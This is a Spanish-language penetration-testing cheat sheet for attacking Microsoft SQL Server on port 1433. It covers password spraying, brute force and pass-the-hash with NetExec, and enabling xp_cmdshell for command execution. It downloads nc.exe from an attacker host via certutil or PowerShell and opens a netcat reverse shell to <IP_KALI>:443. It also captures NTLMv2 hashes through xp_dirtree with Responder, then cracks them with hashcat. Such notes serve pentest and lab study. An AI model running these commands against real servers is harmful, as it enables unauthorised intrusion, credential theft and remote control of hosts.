# Microsoft SQL Server (1433)

Tags: #MSSQL #SQLServer #Windows #DC #RCE #HashCapture #NTLMRelay

## OBJETIVO

- Validar acceso a la base de datos con credenciales o autenticación Windows
- Enumerar bases de datos y usuarios
- Obtener ejecución de comandos vía xp_cmdshell
- Capturar hash NTLMv2 para crackear offline
- Obtener reverse shell desde el servidor SQL

## TIPS

1. **Siempre probar autenticación Windows (-windows-auth) Y autenticación SQL → una puede funcionar cuando la otra no**
2. **xp_cmdshell deshabilitado por defecto → enable_xp_cmdshell lo habilita si eres sysadmin**
3. **xp_dirtree apuntando a tu IP → captura hash NTLMv2 sin necesidad de RCE**
4. **Si tienes SA o sysadmin → ejecución de comandos directa → reverse shell inmediata**
5. **Responder ANTES de ejecutar xp_dirtree → si lo haces al revés no capturas nada**

## TOOLS

- [Impacket-mssqlclient](https://github.com/fortra/impacket)
- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [Responder](https://github.com/lgandx/Responder)
- [sqsh](https://sourceforge.net/projects/sqsh/)
- [Hashcat](https://hashcat.net/hashcat/)

---

## 1. VALIDACIÓN DE ACCESO (ANTES DE CONECTAR)

```bash
❯ nxc mssql <IP> -u 'user' -p 'pass' --local-auth
# Autenticación SQL local → no requiere dominio
# [Pwn3d!] → eres sysadmin → xp_cmdshell disponible

❯ nxc mssql <IP> -u 'user' -p 'pass' -d domain.corp
# Autenticación Windows con dominio → más común en entornos AD

❯ nxc mssql <IP> -u 'user' -H 'NThash' -d domain.corp
# Pass-the-Hash → autenticación Windows sin contraseña en claro

❯ nxc mssql <IP> -u users.txt -p passwords.txt --continue-on-success --local-auth
# Fuerza bruta con autenticación SQL local
# Cuidado con lockout policy

❯ nxc mssql <IP> -u users.txt -p 'Password123' -d domain.corp
# Password spraying con autenticación Windows
```

### Insight

- [Pwn3d!] → eres sysadmin → ir directo a habilitar xp_cmdshell
- Sin [Pwn3d!] pero con acceso → enumerar DBs y capturar hash NTLMv2

---

## 2. CONEXIÓN A LA BASE DE DATOS

```bash
❯ impacket-mssqlclient domain.corp/'user:passwd'@<IP> -windows-auth
# Requiere creds válidas → autenticación Windows (más común en AD)
# -windows-auth → usa credenciales de dominio, no SQL

❯ impacket-mssqlclient domain.corp/'user:passwd'@<IP> -windows-auth -port 1433
# Especificar puerto → útil si MSSQL corre en puerto no estándar

❯ impacket-mssqlclient 'user:passwd'@<IP>
# Sin -windows-auth → autenticación SQL local
# Útil cuando no hay dominio o SA tiene contraseña

❯ sqsh -S <IP> -U 'user' -P 'passwd'
# Alternativa a mssqlclient → cliente SQL interactivo
# Útil cuando impacket falla o no está disponible
# Los comandos terminan con 'go' para ejecutarse
```

---

## 3. ENUMERACIÓN DENTRO DE LA DB

```bash
# Dentro de impacket-mssqlclient:

❯ help
# Ver todos los comandos disponibles

❯ enum_db
# No requiere privilegios especiales → lista todas las bases de datos

❯ enum_users
# Lista usuarios de la base de datos actual

❯ SELECT name FROM master.dbo.sysdatabases
# Query SQL directo → listar todas las DBs

❯ SELECT name, is_disabled FROM sys.server_principals WHERE type = 'S'
# Listar logins SQL y si están deshabilitados

❯ SELECT IS_SRVROLEMEMBER('sysadmin')
# Verificar si el usuario actual es sysadmin
# 1 → sysadmin | 0 → no lo es

❯ xp_dirtree C:\Users\
# Enumerar directorios → no requiere xp_cmdshell
# Útil para explorar el sistema de archivos sin RCE

❯ xp_dirtree C:\inetpub\wwwroot\
# Ruta raíz del servidor IIS → buscar webshells o configs
```

---

## 4. EJECUCIÓN DE COMANDOS (xp_cmdshell)

```bash
# Dentro de impacket-mssqlclient:
# Requiere ser sysadmin para habilitar xp_cmdshell

❯ enable_xp_cmdshell
# Habilita xp_cmdshell → solo funciona si eres sysadmin
# En impacket-mssqlclient este comando lo hace automáticamente

❯ xp_cmdshell "whoami"
# Verifica con qué usuario corre el servicio SQL
# Frecuentemente corre como NT Service\MSSQL o SYSTEM

❯ xp_cmdshell "dir C:\\"
# Listar contenido del disco

❯ xp_cmdshell "net user"
# Usuarios locales del sistema

❯ xp_cmdshell "net localgroup administrators"
# Verificar si el usuario SQL está en admins locales
```

```bash
# Dentro de sqsh:
# Los comandos SQL terminan con 'go'

❯ EXEC xp_cmdshell 'whoami'
❯ go

❯ EXEC xp_cmdshell 'dir C:\\'
❯ go
```

### Insight

- Si xp_cmdshell corre como SYSTEM → tienes control total del host
- Si corre como servicio → buscar PrivEsc para llegar a SYSTEM

---

## 5. OBTENER REVERSE SHELL

```bash
# Dentro de impacket-mssqlclient o sqsh:
# Primero subir netcat al servidor

❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://<IP_KALI>/nc.exe C:\temp\nc.exe'
# Descargar nc.exe desde tu servidor HTTP → requiere xp_cmdshell activo
# Antes: python3 -m http.server 80 en Kali con nc.exe en el directorio

❯ EXEC xp_cmdshell 'C:\temp\nc.exe -e cmd.exe <IP_KALI> 443'
# Ejecutar reverse shell hacia Kali
# Antes: nc -lvnp 443 en Kali para recibir la conexión

# go (si usas sqsh después de cada comando)
```

### Insight

- Crear C:\temp\ antes si no existe: `xp_cmdshell "mkdir C:\temp"`
- Puerto 443 → más probable que pase por firewall que otros puertos
- Alternativa a certutil: `powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://IP/nc.exe','C:\temp\nc.exe')"`

---

## 6. CAPTURA DE HASH NTLMv2 (SIN RCE)

### Con Responder

```bash
# PASO 1 — Iniciar Responder PRIMERO en Kali
❯ responder -I tun0
# Poner en escucha antes de ejecutar xp_dirtree
# -v → ver el hash capturado anteriormente también

# PASO 2 — Dentro de mssqlclient, apuntar a tu IP
❯ xp_dirtree \\<IP_KALI>\aa
# Intenta acceder a un share que no existe en tu Kali
# Windows autentica automáticamente → captura el hash NTLMv2

# PASO 3 — Crackear el hash capturado
❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# Modo 5600 → NTLMv2
```

### Con impacket-smbserver

```bash
# PASO 1 — Montar servidor SMB en Kali
❯ impacket-smbserver smbFolder $(pwd) -smb2support
# Levanta servidor SMB en el directorio actual
# Captura la autenticación cuando MSSQL intente conectarse

# PASO 2 — Dentro de mssqlclient
❯ xp_dirtree \\<IP_KALI>\smbFolder\test
# Apuntar al share que creaste → captura el hash

# PASO 3 — Crackear el hash
❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Con sqsh

```bash
# PASO 1 — Iniciar Responder PRIMERO
❯ responder -I tun0

# PASO 2 — Conectar con sqsh y ejecutar
❯ sqsh -S <IP> -U 'user' -P 'passwd'
❯ xp_dirtree '\\<IP_KALI>\aa'
❯ go
# go → ejecuta el comando en sqsh
```

### Insight

- Hash NTLMv2 capturado → crackear con hashcat -m 5600 + rockyou
- Si crackeas → tienes contraseña en claro → probar en SMB / WinRM / RDP
- Si no crackeas → intentar relay con ntlmrelayx (ver nota de lateral movement)

---

## CONDICIONES CLAVE

- [Pwn3d!] en nxc → sysadmin → habilitar xp_cmdshell → RCE directo
- Sin [Pwn3d!] pero con acceso → capturar hash NTLMv2 con xp_dirtree
- Hash capturado → crackear con hashcat -m 5600
- xp_cmdshell activo → subir nc.exe → reverse shell

## ONE-LINERS MENTALES

- Puerto 1433 abierto → validar con nxc mssql antes de conectar
- [Pwn3d!] → enable_xp_cmdshell → xp_cmdshell "whoami"
- Sin sysadmin → Responder primero → xp_dirtree a tu IP → hash NTLMv2
- Hash crackeado → probar en SMB / WinRM / RDP inmediatamente
- RCE disponible → certutil para bajar nc.exe → reverse shell al 443